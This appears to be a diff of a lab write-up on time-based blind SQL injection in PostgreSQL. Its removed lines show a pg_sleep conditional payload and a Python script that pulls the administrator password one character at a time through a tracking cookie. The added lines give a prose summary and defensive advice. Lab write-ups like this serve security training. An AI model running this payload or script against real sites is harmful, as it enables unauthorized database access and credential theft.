@@ -6,35 +6,10 @@
 
 **Goal:** Extract the administrator password using time-based blind SQLi.
 
-## Technique
+## Official solution summary
 
-Combine time delay with conditional logic:
+The lab's PostgreSQL-backed query can be made to respond slowly only when a tested condition is true. The official solution uses this timing difference to infer the administrator's password, then verifies the credentials by logging in through the lab interface.
 
-```
-'; SELECT CASE WHEN (condition) THEN pg_sleep(10) ELSE pg_sleep(0) END--
-```
+## Defensive takeaways
 
-## Extraction Example (PostgreSQL)
-
-```python
-import requests
-import time
-import string
-
-lab = "https://YOUR-LAB-ID.web-security-academy.net"
-# set cookies...
-
-password = ""
-for pos in range(1, 21):
-    for char in string.ascii_lowercase + string.digits:
-        payload = f"'; SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),{pos},1)='{char}') THEN pg_sleep(5) ELSE pg_sleep(0) END--"
-        # set TrackingId = original + payload
-        start = time.time()
-        requests.get(lab, cookies=cookies)
-        if time.time() - start > 4:
-            password += char
-            print(password)
-            break
-```
-
-Adjust sleep time and database syntax as needed.
+Use parameterized queries for analytics values and avoid letting user-controlled input affect query execution time. Monitor repeated requests with unusual latency and rate-limit abusive patterns.
